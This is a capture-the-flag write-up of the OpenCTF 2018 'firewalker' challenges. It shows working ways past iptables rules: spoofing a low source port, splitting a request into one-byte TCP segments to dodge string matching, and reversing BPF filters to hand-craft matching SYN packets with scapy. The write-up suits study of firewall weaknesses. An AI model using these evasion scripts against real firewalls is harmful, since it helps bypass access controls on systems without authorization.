# Challenges

This is a writeup of a series of challenges called firewalker{0-3} released as part of OpenCTF 2018 @ DEFCON26. We managed to solve fire_walker 0-2 during the competition, and we believe we found a partial solution for firewalker_3 a few days after the competition ended. Specifically, firewalker_3 required our firewall-avoiding client to also talk SSL to the server, unlike the other challenges. This part we didn't implement, only the firewall part. The challenge points were 50, 200, 350 and 500, respectively.

Each challenge consists of (ip, port) for a webserver, a HTTP GET endpoint exposing the flag, e.g. `/flag-4ae60838.txt`, and, crucially, a set of iptables rules that protect this HTTP endpoint. So the point of the challenges is to craft an HTTP GET request that passes these filter rules. 

# firewalker_0

For this task we need to GET `http://172.31.2.97:20621/flag-d12bb978.txt` with these rules in place:

```
Chain PORT_20621 (1 references)
target     prot opt source               destination         
REJECT     tcp  --  anywhere             anywhere             tcp spts:1024:65535 reject-with icmp-admin-prohibited
```

Obviously this is not a full dump of the rules applied to the server - how do packets even go in the `PORT_20621` chain? Most likely there is another undisclosed rule for INPUT:

```
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
PORT_20621  tcp  --  anywhere             anywhere             tcp dpt:20621
```

In this instance there is a single rule that could lead to a REJECT state, and it does not require much processing to parse the rule: `tcp spts:1024:65535` means that the rule matches any packet containing a tcp layer where the source port is set to any port in the range 1024-65535 inclusive. To avoid being caught by this rule, we have to make sure our source port is less than 1024. This can easily be done since the source port can be chosen by us. For instance, this `curl` command gets the flag:

```bash
curl --local-port 999 http://172.31.2.97:20621/flag-d12bb978.txt
```

# firewalker_1

Same overall principle as above: We need to GET `http://172.31.2.97:30485/flag-4ae60838.txt`, but now guarded by these rules:

```
Chain PORT_30485 (1 references)
target     prot opt source               destination         
REJECT     tcp  --  anywhere             anywhere             STRING match  "GET" ALGO name bm TO 65535 ICASE reject-with tcp-reset
REJECT     tcp  --  anywhere             anywhere             STRING match  "/flag-4ae60838.txt" ALGO name bm TO 65535 ICASE reject-with tcp-reset
REJECT     tcp  --  anywhere             anywhere             STRING match  "HTTP/1" ALGO name bm TO 65535 ICASE reject-with tcp-reset
```

This challenge cleverly teaches a "leason" on the different abstractions of the IP and TCP layers, respectively, in the networking stack. TCP exposes a _stream_ of bytes transmitted in any number of (arbitrarily sized) chunks to be later re-assembled (usually by "buffering") by the receiver. On the other hand, the IP layer models a sequence of clearly distinct packets between a sender and a receiver purpusefully designed to be (theoretically) ignorant about the nature of the payload, including the fact that they may convey (parts of) a TCP stream. Crucially for this challenge, iptables rules apply to each _IP packet individually_ in the sequence of packets used to transfer the _TCP stream_ from the client to the server. 

In this case, it means that the rules apply the string matching rules (an iptables extension module) to each IP packet in isolation. On the other hand, the _HTTP_ server just needs a stream of bytes that eventually spell out a valid HTTP request, buffering whatever it partially receives until it has all it needs (or is able to determine that it is an invalid request).

Thus to solve this challenge we merely need to split up our full TCP-based HTTP request into enough distinct IP packets to avoid the strings matching any _one_ packet:

```py
#!/usr/bin/env python2
import socket
import time

sock = socket.socket()
sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
sock.connect(('172.31.2.97', 30485))

for c in 'GET /flag-4ae60838.txt HTTP/1.1\r\nHost: 172.31.2.97:30485\r\n\r\n':
    sock.send(c)
    print 'sent {}'.format(c),
    time.sleep(1)

while True:
    print sock.recv(1024),
```

This snippet manually chunks the TCP stream into IP packets each containing 1 byte of the full request with a little code to force the TCP stack to transmit the chunks individually. A little bit overkill to split everything into single bytes to bypass these particular filters, but it was quick to implement.

# firewalker_2

This next level upped the ante quite a bit. The rules guarding `http://172.31.2.97:15646/flag-742c78b2.txt` were:

```
Chain PORT_15646 (1 references)
target     prot opt source               destination         
RETURN     all  --  anywhere             anywhere            match bpf 48 0 0 32,84 0 0 240,116 0 0 2,4 0 0 20,2 0 0 0,1 0 0 40,96 0 0 0,28 0 0 0,21 51 0 0,80 0 0 0,21 20 0 2,37 3 0 1,135 0 0 0,4 0 0 1,5 0 0 2,80 0 0 1,12 0 0 0,7 0 0 0,96 0 0 0,28 0 0 0,21 39 0 0,80 0 0 0,21 8 0 2,37 3 0 1,135 0 0 0,4 0 0 1,5 0 0 2,80 0 0 1,12 0 0 0,7 0 0 0,5 0 0 29,72 0 0 2,2 0 0 1,20 0 0 1461,53 0 25 12648430,96 0 0 1,148 0 0 2,21 0 22 1,96 0 0 1,148 0 0 3,21 0 19 2,96 0 0 1,148 0 0 5,53 16 0 4,96 0 0 1,148 0 0 11,37 0 13 2,96 0 0 1,148 0 0 17,37 0 10 9,96 0 0 1,148 0 0 23,53 7 0 5,96 0 0 1,148 0 0 42,37 0 4 30,96 0 0 1,148 0 0 61,37 0 1 50,6 0 0 262144,6 0 0 0
REJECT     all  --  anywhere             anywhere             reject-with icmp-admin-prohibited
```

Quite obscure on the face of it, but the `match bpf` gives it away as an embedded BPF program responsible for the filtering decision. Most people are properly familiar with [BPF](https://www.kernel.org/doc/Documentation/networking/filter.txt) from packet _capturing_, but an iptables extensions allows its usage for firewalling.

We will not go into any detail about the binary format of a BPF program. There exists various tools and scripts online that can decompile those "numbers" into more readable assembly listings. Some tools require the program to be a binary packed BPF program. This can be obtained by the [pack_bpf.py](pack_bpf.py) python script:

```py
#!/usr/bin/env python2
import sys
from struct import pack
# read in bpf from iptables rule
prog = sys.stdin.read()
s = map(int, prog.replace(',', ' ').split(' '))
for i in range(0, len(s), 4):
    sys.stdout.write(pack('<HBBI', *s[i:i+4]))
```

using this command:

```bash
$ echo -n '48 0 0 32,84 0 0 240,116 0 0 2,4 0 0 20,2 0 0 0,1 0 0 40,96 0 0 0,28 0 0 0,21 51 0 0,80 0 0 0,21 20 0 2,37 3 0 1,135 0 0 0,4 0 0 1,5 0 0 2,80 0 0 1,12 0 0 0,7 0 0 0,96 0 0 0,28 0 0 0,21 39 0 0,80 0 0 0,21 8 0 2,37 3 0 1,135 0 0 0,4 0 0 1,5 0 0 2,80 0 0 1,12 0 0 0,7 0 0 0,5 0 0 29,72 0 0 2,2 0 0 1,20 0 0 1461,53 0 25 12648430,96 0 0 1,148 0 0 2,21 0 22 1,96 0 0 1,148 0 0 3,21 0 19 2,96 0 0 1,148 0 0 5,53 16 0 4,96 0 0 1,148 0 0 11,37 0 13 2,96 0 0 1,148 0 0 17,37 0 10 9,96 0 0 1,148 0 0 23,53 7 0 5,96 0 0 1,148 0 0 42,37 0 4 30,96 0 0 1,148 0 0 61,37 0 1 50,6 0 0 262144,6 0 0 0' | ./pack_bpf.py > firewalker_2.bpf
```

The task now is to reverse the BPF program to hopefully be able to construct one (or more) packets that can pass the filter to reach the HTTP server. We will not cover how to obtain the disassembly listing, but using something like `bpf_dbg` from [github.com/cloudflare/bpftools](https://github.com/cloudflare/bpftools/tree/master/linux_tools) should be able to provide this functionality. 

Below is the annotated disassembly we ended up with during the competition. Comments is everything following a ';' and until a newline. For the semantics of individual instructions, we refer to the Linux documentation quoted above. In general, one has to know that BPF programs can only jump forward. A filtering decision is based on which `return` statement reached, where `return 0x0` means REJECT, whereas `return x`, x usually being large positive integer, generally means ACCEPT.

```
; pc   op   jt   jf      k      instr
;-------------------------------------

;; Contraints:
;; (((((byte)pkt[0x20] & 0xf0) >> 2) + 20) - 0x28) != 0

0000: 0x30 0x00 0x00 0x00000020 ldb [0x20]           ; A = (byte)pkt[0x20]
0001: 0x54 0x00 0x00 0x000000f0 and #240             ; A &= #240
0002: 0x74 0x00 0x00 0x00000002 rsh #2               ; A >>= #2
0003: 0x04 0x00 0x00 0x00000014 add #20              ; A += #20
0004: 0x02 0x00 0x00 0x00000000 st #0x0              ; M[0] = (dword) A
0005: 0x01 0x00 0x00 0x00000028 ldx #0x28            ; X = 0x28
0006: 0x60 0x00 0x00 0x00000000 ld M[0]              ; A = M[0]
0007: 0x1c 0x00 0x00 0x00000000 sub x                ; A -= X
0008: 0x15 0x33 0x00 0x00000000 jeq #0, 0060         ; (A == #0) ? 0060 : 0009

;; M[0] = ((pkt[0x20] & 0xf0) >> 2) + 20
;; X = 0x28
;; A = (byte)pkt[X]

;; Fast Track:
;; pkt[0x28] == 2 -> 0031

0009: 0x50 0x00 0x00 0x00000000 ldb [x + 0x0]        ; A = (byte)pkt[X + 0x0]
0010: 0x15 0x14 0x00 0x00000002 jeq #2, 0031         ; (A == #2) ? 0031 : 0011

;; Slow Track Branch:
0011: 0x25 0x03 0x00 0x00000001 jgt #1, 0015         ; (A > #1) ? 0015 : 0012

;; Slow A (pkt[0x28] <= 1
)
;; A = 0x28 + 1
0012: 0x87 0x00 0x00 0x00000000 txa                  ; A = X
0013: 0x04 0x00 0x00 0x00000001 add #1               ; A += #1
0014: 0x05 0x00 0x00 0x00000002 jmp #2, 0017         ; goto 0017

;; Slow B (pkt[0x28] > 2)
;; X = 0x28 (unchanged)
;; A += X
0015: 0x50 0x00 0x00 0x00000001 ldb [x + 0x1]        ; A = (byte)pkt[X + 0x1]
0016: 0x0c 0x00 0x00 0x00000000 add x                ; A += X

;;
;; Slow Decision
;; X = 0x29 (Slow A) or 0x28+(byte)pkt[0x29] (Slow B)

;; Constraints:
;; M[0] - X != 0
;; (byte)pkt[X] == 2 -> 0031
0017: 0x07 0x00 0x00 0x00000000 tax                  ; X = A
0018: 0x60 0x00 0x00 0x00000000 ld M[0]              ; A = M[0]
0019: 0x1c 0x00 0x00 0x00000000 sub x                ; A -= X
0020: 0x15 0x27 0x00 0x00000000 jeq #0, 0060         ; (A == #0) ? 0060 : 0021

;; Escape:
0021: 0x50 0x00 0x00 0x00000000 ldb [x + 0x0]        ; A = (byte)pkt[X + 0x0]
0022: 0x15 0x08 0x00 0x00000002 jeq #2, 0031         ; (A == #2) ? 0031 : 0023

;; Dead End:
0023: 0x25 0x03 0x00 0x00000001 jgt #1, 0027         ; (A > #1) ? 0027 : 0024
0024: 0x87 0x00 0x00 0x00000000 txa                  ; A = X
0025: 0x04 0x00 0x00 0x00000001 add #1               ; A += #1
0026: 0x05 0x00 0x00 0x00000002 jmp #2, 0029         ; goto 0029
0027: 0x50 0x00 0x00 0x00000001 ldb [x + 0x1]        ; A = (byte)pkt[X + 0x1]
0028: 0x0c 0x00 0x00 0x00000000 add x                ; A += X
0029: 0x07 0x00 0x00 0x00000000 tax                  ; X = A
0030: 0x05 0x00 0x00 0x0000001d jmp #29, 0060        ; goto 0060


;; Constraints:
;; X = 0x28 (Fast) or 0x29 (Slow A) or 0x28+(byte)pkt[0x28] (Slow B)
;; A = (word)pkt[X + 0x2]
;; 
;; (A - 1461) > 0xc0ffee
;; A % 2 == 1
;; A % 3 == 2
;; A % 5 < 4
;; A % 11 > 2
;; A % 17 > 9
;; A % 23 < 5
;; A % 42 > 30
;; A % 61 > 50

0031: 0x48 0x00 0x00 0x00000002 ldh [x + 0x2]        ; A = (word)pkt[X + 0x2]
0032: 0x02 0x00 0x00 0x00000001 st #0x1              ; M[1] = (dword) A
0033: 0x14 0x00 0x00 0x000005b5 sub #1461            ; A -= #1461
0034: 0x35 0x00 0x19 0x00c0ffee jge #12648430, 0035, 0060 ; (A >= #12648430) ? 0035 : 0060

0035: 0x60 0x00 0x00 0x00000001 ld M[1]              ; A = M[1]
0036: 0x94 0x00 0x00 0x00000002 mod #2               ; A %= #2
0037: 0x15 0x00 0x16 0x00000001 jeq #1, 0038, 0060   ; (A == #1) ? 0038 : 0060
0038: 0x60 0x00 0x00 0x00000001 ld M[1]              ; A = M[1]
0039: 0x94 0x00 0x00 0x00000003 mod #3               ; A %= #3
0040: 0x15 0x00 0x13 0x00000002 jeq #2, 0041, 0060   ; (A == #2) ? 0041 : 0060
0041: 0x60 0x00 0x00 0x00000001 ld M[1]              ; A = M[1]
0042: 0x94 0x00 0x00 0x00000005 mod #5               ; A %= #5
0043: 0x35 0x10 0x00 0x00000004 jge #4, 0060         ; (A >= #4) ? 0060 : 0044
0044: 0x60 0x00 0x00 0x00000001 ld M[1]              ; A = M[1]
0045: 0x94 0x00 0x00 0x0000000b mod #11              ; A %= #11
0046: 0x25 0x00 0x0d 0x00000002 jgt #2, 0047, 0060   ; (A > #2) ? 0047 : 0060
0047: 0x60 0x00 0x00 0x00000001 ld M[1]              ; A = M[1]
0048: 0x94 0x00 0x00 0x00000011 mod #17              ; A %= #17
0049: 0x25 0x00 0x0a 0x00000009 jgt #9, 0050, 0060   ; (A > #9) ? 0050 : 0060
0050: 0x60 0x00 0x00 0x00000001 ld M[1]              ; A = M[1]
0051: 0x94 0x00 0x00 0x00000017 mod #23              ; A %= #23
0052: 0x35 0x07 0x00 0x00000005 jge #5, 0060         ; (A >= #5) ? 0060 : 0053
0053: 0x60 0x00 0x00 0x00000001 ld M[1]              ; A = M[1]
0054: 0x94 0x00 0x00 0x0000002a mod #42              ; A %= #42
0055: 0x25 0x00 0x04 0x0000001e jgt #30, 0056, 0060  ; (A > #30) ? 0056 : 0060
0056: 0x60 0x00 0x00 0x00000001 ld M[1]              ; A = M[1]
0057: 0x94 0x00 0x00 0x0000003d mod #61              ; A %= #61
0058: 0x25 0x00 0x01 0x00000032 jgt #50, 0059, 0060  ; (A > #50) ? 0059 : 0060

;; Accept
0059: 0x06 0x00 0x00 0x00040000 ret 0x00040000      

;; Reject
0060: 0x06 0x00 0x00 0x00000000 ret 0x00000000      
```

In summary, the program sets up a sequence of constraints on various bytes in the packet. We never fully reversed what all the branches in the code did. Our primary goal was to transform as many of the constraints into something more readable and debuggable as needed to form the packet(s). We re-implemented most of it in python:

```py
def check1(pkt):
    '''
    tcp.dataofs != 5
    '''
    return (((ord(str(pkt)[0x20]) & 0xf0) >> 2) + 20) - 0x28 != 0

def check2(pkt):
    '''
    tcp.options[0].kind == MSS
    '''
    return (ord(str(pkt)[0x28]) == 2)

def check3(pkt):
    '''
    tcp.options[0].data == 1337
    '''
    d = str(pkt)
    A = unpack('>H', d[0x28+2:0x28+2+2])[0]
    # solve using Z3
    return ((A - 1461) & 0xffffffff) > 0xc0ffee and \
        (A % 2 == 1) and \
        (A % 3 == 2) and \
        (A % 5 < 4) and \
        (A % 11 > 2) and \
        (A % 17 > 9) and \
        (A % 23 < 5) and \
        (A % 42 > 30) and \
        (A % 61 > 50)
```

We only got as far as to implement the "Fast" path as described in the BPF listing. This proved enough to successfully get the flag. As is, the disclosed rule should not have been enough to yield the flag given our final solution. It might be that the remaining branches of the filter program handles the subsequent ACK packages, but we just assumed that there must be some additional iptables rules not included in the hand out. Specifically, we assumed this rule:

`ACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED`

meaning we "just" need to form a valid SYN packet to pass the firewall. Without such a rule, our solution does not pass our test setup.

Using tables of [IP packet](https://en.wikipedia.org/wiki/IPv4) and [TCP packet](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#TCP_segment_structure) structures, we deduced what fields of the respective packets were checked by the constraints. The constraints are summarized in the docstring of the `check` functions, and leads to construction of this SYN packet to pass the filter:

```py
i = IP(
    ihl = 5,
    dst = dst,
    )
t = TCP(
    dport = 15646,
    sport = 9975,
    flags = 'S',
    # check1
    dataofs = 7,
    )
# set a MSS option with the correct value, check2 and check3
options = Raw('\x02\x04'+'\x05\x39\x00\x00'+'\x00\x00')
p = i/t/options

assert check1(p), 'fails check1'
assert check2(p), 'fails check2'
assert check3(p), 'fails check3'
```

The follow-up packets contain the HTTP GET request and did not require special crafting. The full script to get the flag can be found in [firewalker2.py](firewalker2.py). Since we injecting packets directly on the wire, we need to add a rule to our own firewall to prevent our kernel from resetting the connection we are setting up:

`iptables -A OUTPUT -p tcp --tcp-flags RST RST --dport 15646 -j DROP`

# firewalker_3

Like firewalker_2, firewalker_3 also was about a BPF firewall rule. Unlike firewalker_2, this endpoint also talked SSL at the application layer. We didn't complete this challenge during the CTF, but were able to finish the firewall part of the challenge afterwards. We tested it against a setup that we believe mimics the actual game setup, but without the SSL layer. In firewalker_3, the flag endpoint `https://172.31.2.97:27392/flag-192ce834.txt` was protected by this BPF-based filter:

```
Chain PORT_27302 (1 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED
RETURN     all  --  anywhere             anywhere            match bpf 0 0 0 0,48 0 0 8,37 52 0 195,37 0 51 160,48 0 0 0,84 0 0 15,21 0 48 5,48 0 0 9,21 0 46 6,40 0 0 6,69 44 0 8191,177 0 0 0,72 0 0 22,21 0 41 1321,72 0 0 14,21 0 39 8192,80 0 0 12,116 0 0 4,21 0 36 11,80 0 0 20,21 0 34 2,80 0 0 24,21 0 32 1,80 0 0 25,21 0 30 3,80 0 0 28,21 0 28 1,80 0 0 29,21 0 26 1,80 0 0 30,21 0 24 8,80 0 0 40,21 0 22 4,48 0 0 6,69 0 20 64,69 19 0 128,64 0 0 32,21 0 17 0,40 0 0 2,2 0 0 5,48 0 0 0,84 0 0 15,36 0 0 4,7 0 0 0,96 0 0 5,28 0 0 0,2 0 0 9,177 0 0 0,80 0 0 12,116 0 0 4,36 0 0 4,7 0 0 0,96 0 0 9,29 0 1 0,6 0 0 65536,6 0 0 0
REJECT     all  --  anywhere             anywhere             reject-with icmp-admin-prohibited
```

The rules were changed about an hour before the CTF ended to "make the challenge solvable on wifi", according to the organizers. Since we didn't actually solve it during the CTF, we cannot say what exactly the problem had been. Oftentimes you can get hints from diffing updated challenges, but in this case we didn't really had any advantage of the update.

Using the techniques from firewalker_2, we get the BPF disassembly and started re-implementing the contraints in python:

```
; pc   op   jt   jf      k      instr
;-------------------------------------

;; check1
0000: 0x00 0x00 0x00 0x00000000 ld #0x0              ; A = 0x0
0001: 0x30 0x00 0x00 0x00000008 ldb [0x8]            ; A = (byte)pkt[0x8]
0002: 0x25 0x34 0x00 0x000000c3 jgt #195, 0055       ; (A > #195) ? 0055 : 0003
0003: 0x25 0x00 0x33 0x000000a0 jgt #160, 0004, 0055 ; (A > #160) ? 0004 : 0055

;; check2
0004: 0x30 0x00 0x00 0x00000000 ldb [0x0]            ; A = (byte)pkt[0x0]
0005: 0x54 0x00 0x00 0x0000000f and #15              ; A &= #15
0006: 0x15 0x00 0x30 0x00000005 jeq #5, 0007, 0055   ; (A == #5) ? 0007 : 0055

;; check3
0007: 0x30 0x00 0x00 0x00000009 ldb [0x9]            ; A = (byte)pkt[0x9]
0008: 0x15 0x00 0x2e 0x00000006 jeq #6, 0009, 0055   ; (A == #6) ? 0009 : 0055

;; check4
0009: 0x28 0x00 0x00 0x00000006 ldh [0x6]            ; A = (word)pkt[0x6]
0010: 0x45 0x2c 0x00 0x00001fff jset #8191, 0055     ; (A & #8191) ? 0055 : 0011

;; check5
0011: 0xb1 0x00 0x00 0x00000000 ldxb 4*([0x0]&0xf)   ; X = (byte)4*(pkt[0x0] & 0xf)
0012: 0x48 0x00 0x00 0x00000016 ldh [x + 0x16]       ; A = (word)pkt[X + 0x16]
0013: 0x15 0x00 0x29 0x00000529 jeq #1321, 0014, 0055 ; (A == #1321) ? 0014 : 0055

;; check6
0014: 0x48 0x00 0x00 0x0000000e ldh [x + 0xe]        ; A = (word)pkt[X + 0xe]
0015: 0x15 0x00 0x27 0x00002000 jeq #8192, 0016, 0055 ; (A == #8192) ? 0016 : 0055

;; check7
0016: 0x50 0x00 0x00 0x0000000c ldb [x + 0xc]        ; A = (byte)pkt[X + 0xc]
0017: 0x74 0x00 0x00 0x00000004 rsh #4               ; A >>= #4
0018: 0x15 0x00 0x24 0x0000000b jeq #11, 0019, 0055  ; (A == #11) ? 0019 : 0055
0019: 0x50 0x00 0x00 0x00000014 ldb [x + 0x14]       ; A = (byte)pkt[X + 0x14]
0020: 0x15 0x00 0x22 0x00000002 jeq #2, 0021, 0055   ; (A == #2) ? 0021 : 0055
0021: 0x50 0x00 0x00 0x00000018 ldb [x + 0x18]       ; A = (byte)pkt[X + 0x18]
0022: 0x15 0x00 0x20 0x00000001 jeq #1, 0023, 0055   ; (A == #1) ? 0023 : 0055
0023: 0x50 0x00 0x00 0x00000019 ldb [x + 0x19]       ; A = (byte)pkt[X + 0x19]
0024: 0x15 0x00 0x1e 0x00000003 jeq #3, 0025, 0055   ; (A == #3) ? 0025 : 0055
0025: 0x50 0x00 0x00 0x0000001c ldb [x + 0x1c]       ; A = (byte)pkt[X + 0x1c]
0026: 0x15 0x00 0x1c 0x00000001 jeq #1, 0027, 0055   ; (A == #1) ? 0027 : 0055
0027: 0x50 0x00 0x00 0x0000001d ldb [x + 0x1d]       ; A = (byte)pkt[X + 0x1d]
0028: 0x15 0x00 0x1a 0x00000001 jeq #1, 0029, 0055   ; (A == #1) ? 0029 : 0055
0029: 0x50 0x00 0x00 0x0000001e ldb [x + 0x1e]       ; A = (byte)pkt[X + 0x1e]
0030: 0x15 0x00 0x18 0x00000008 jeq #8, 0031, 0055   ; (A == #8) ? 0031 : 0055
0031: 0x50 0x00 0x00 0x00000028 ldb [x + 0x28]       ; A = (byte)pkt[X + 0x28]
0032: 0x15 0x00 0x16 0x00000004 jeq #4, 0033, 0055   ; (A == #4) ? 0033 : 0055

;; check8
0033: 0x30 0x00 0x00 0x00000006 ldb [0x6]            ; A = (byte)pkt[0x6]
0034: 0x45 0x00 0x14 0x00000040 jset #64, 0035, 0055 ; (A & #64) ? 0035 : 0055
0035: 0x45 0x13 0x00 0x00000080 jset #128, 0055      ; (A & #128) ? 0055 : 0036

;; check9
0036: 0x40 0x00 0x00 0x00000020 ld [x + 0x20]        ; A = pkt[X + 0x20]
0037: 0x15 0x00 0x11 0x00000000 jeq #0, 0038, 0055   ; (A == #0) ? 0038 : 0055
0038: 0x28 0x00 0x00 0x00000002 ldh [0x2]            ; A = (word)pkt[0x2]
0039: 0x02 0x00 0x00 0x00000005 st #0x5              ; M[5] = (dword) A
0040: 0x30 0x00 0x00 0x00000000 ldb [0x0]            ; A = (byte)pkt[0x0]
0041: 0x54 0x00 0x00 0x0000000f and #15              ; A &= #15
0042: 0x24 0x00 0x00 0x00000004 mul #4               ; A *= #4
0043: 0x07 0x00 0x00 0x00000000 tax                  ; X = A
0044: 0x60 0x00 0x00 0x00000005 ld M[5]              ; A = M[5]
0045: 0x1c 0x00 0x00 0x00000000 sub x                ; A -= X
0046: 0x02 0x00 0x00 0x00000009 st #0x9              ; M[9] = (dword) A
0047: 0xb1 0x00 0x00 0x00000000 ldxb 4*([0x0]&0xf)   ; X = (byte)4*(pkt[0x0] & 0xf)
0048: 0x50 0x00 0x00 0x0000000c ldb [x + 0xc]        ; A = (byte)pkt[X + 0xc]
0049: 0x74 0x00 0x00 0x00000004 rsh #4               ; A >>= #4
0050: 0x24 0x00 0x00 0x00000004 mul #4               ; A *= #4
0051: 0x07 0x00 0x00 0x00000000 tax                  ; X = A
0052: 0x60 0x00 0x00 0x00000009 ld M[9]              ; A = M[9]
0053: 0x1d 0x00 0x01 0x00000000 jeq x, 0054, 0055    ; (A == X) ? 0054 : 0055

;; win
0054: 0x06 0x00 0x00 0x00010000 ret 0x00010000      

;; lose
0055: 0x06 0x00 0x00 0x00000000 ret 0x00000000      
```

Even though the BPF program had many more checks for various parts of both the IP and TCP layers, the program was in fact much simpler to reverse than firewalker_2, since it had fewer branches and fewer temporary variables. We pretty much just implemented equivalent python "check" functions from top to bottom:

```python
def check1(pkt):
    '''160 < ip.ttl <= 195'''
    x = ord(pkt[0x8])
    return x <= 195 and x > 160

# IHL == 5
def check2(pkt): return ord(pkt[0]) & 15 == 5
# prot == 6 (TCP)
def check3(pkt): return ord(pkt[0x9]) == 6
# IP fragment offset == 0
def check4(pkt): 
    return unpack('>H', pkt[0x6:0x8])[0] & 8191 == 0

def check5(pkt):
    '''some TCP option with body #1321'''
    X = 4 * (ord(pkt[0]) & 0xf)
    return unpack('>H', pkt[X+0x16:X+0x16+2])[0] == 1321

def check6(pkt):
    '''tcp.flags == 0x2000'''
    X = 4 * (ord(pkt[0]) & 0xf)
    return unpack('>H', pkt[X+0xe:X+0xe+2])[0] == 8192

def check7(pkt):
    '''
    tcp
        .dataofs >> 4 == 11 (11 32-bit words header)
        .opts[0].kind == 2  (mss; check5)
        .opts[1].kind == 1  (no-op)
        ...
    '''
    X = 4 * (ord(pkt[0]) & 0xf)
    assert    ord(pkt[X+0xc]) >> 4 == 11
    # mss
    assert    ord(pkt[X+0x14]) == 2
    # noop (1 byte)
    assert    ord(pkt[X+0x18]) == 1
    # window scale (3 bytes)
    assert    ord(pkt[X+0x19]) == 3
    # no-ops
    assert    ord(pkt[X+0x1c]) == 1
    assert    ord(pkt[X+0x1d]) == 1
    # tcp timestamp (10 bytes)
    assert    ord(pkt[X+0x1e]) == 8
    # Selective Ack Permitted (2 bytes)
    assert    ord(pkt[X+0x28]) == 4
    # (somewhere in timestamp)
    assert    ord(pkt[X+0x20]) == 0
    return True


def check8(pkt):
    '''ip.flags & 0x40 == 1
       ip.flags & 0x80 == 0'''
    A = ord(pkt[0x6])
    return A & 64 != 0 and A & 128 == 0

def check9(pkt):
    '''
    tcp.dataofs == ip.total_length - ip.ihl
    '''
    TOTALLEN = M5 = unpack('>H', pkt[0x2:0x4])[0]
    IHL = X = 4 * (ord(pkt[0]) & 15)
    PAYLEN = M9 = TOTALLEN - IHL
    IHL = X = 4 * (ord(pkt[0]) & 15)
    A = 4*(ord(pkt[X+0xc]) >> 4)
    return A == PAYLEN
```

Next step is mapping the constraints from packet byte offsets/values to IP and TCP packet fields (and values). Finally, we again used scapy to construct a SYN packet that satisfies the constraints. The tricky checks are `check7` and `check9` which required that we hand-craft the TCP options to be included:

```python
i = IP(
    # check2
    ihl = 5,
    dst = dst,
    # check1 - routers on the way decrement this, so make sure it is
    # sufficiently higher than 161
    ttl = 180,
    # check8
    flags = 'DF',
    # check4 implied by defaults
    )
t = TCP(
    dport = dst_port,
    sport = srcport,
    # check6
    flags = 'S',
    # check7, and options below
    dataofs = 11,
    )
options = Raw(
    # check5 - this was changed during competition
    # mss
    '\x02\x04'+'\x05\x29' +
    
    # check7
    # nop
    '\x01' +
    # window scale
    '\x03\x03\x01' +
    # nops
    '\x01\x01' + 
    # timestamp
    '\x08\x0a' + '\x00'*8 +
    # sel ack
    '\x04\x02'
)
# check9
align = 11*4 - len(str(options)) - len(str(t))
print 'tcp opt alignment: {:#x}'.format(align)
pad = Raw('\x00'*align)
p = i/t/options/pad
```

From there the `RELATED,ESTABLISHED` iptables rule allows us to retrieve the flag, but with the added complication of doing a TLS handshake before sending our HTTPS request. A partial solution script for HTTP only is in [firewalker3.py](firewalker3.py). Similar to firewalker_2, we must add a rule to our own firewall to prevent our networking stack from resetting the connection:

`iptables -A OUTPUT -p tcp --tcp-flags RST RST --dport 27302 -j DROP`
